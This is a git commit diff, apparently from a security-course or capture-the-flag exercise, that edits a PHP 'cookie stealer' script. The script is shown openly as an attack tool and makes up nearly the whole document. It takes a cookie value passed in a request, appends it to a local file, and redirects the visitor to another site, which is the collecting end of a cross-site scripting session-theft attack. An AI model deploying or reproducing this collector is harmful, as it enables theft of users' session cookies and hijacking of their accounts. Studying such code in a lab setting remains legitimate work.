c6ee0797b17f3f2d9659e8ed85842eaf998a4e5c
Nikolas Iliopoulos <nikolasil2000@gmail.com>
2022-05-09 23:38:54 +0300

    cookie stealer progress

--- puppies/cookie_stealer.php
+++ puppies/cookie_stealer.php
@@ -1,15 +1,9 @@
 <?php
 
 if (isset($_REQUEST["cookie"])) {
-  echo '1' . $_REQUEST["cookie"];
   $fp = fopen("cookies.txt", "a+");
-  fwrite($fp, $_REQUEST["cookie"] . "\n\n");
-  fclose($fp);
-} else {
-  echo '2';
-  $fp = fopen("cookies.txt", "a+");
-  fwrite($fp, "no cookie provided");
+  fwrite($fp, $_REQUEST["cookie"] . "\n");
   fclose($fp);
 }
 
-//header("Location: http://kerberosclan.csec.chatzi.org/");
+header("Location: http://kerberosclan.puppies.chatzi.org");
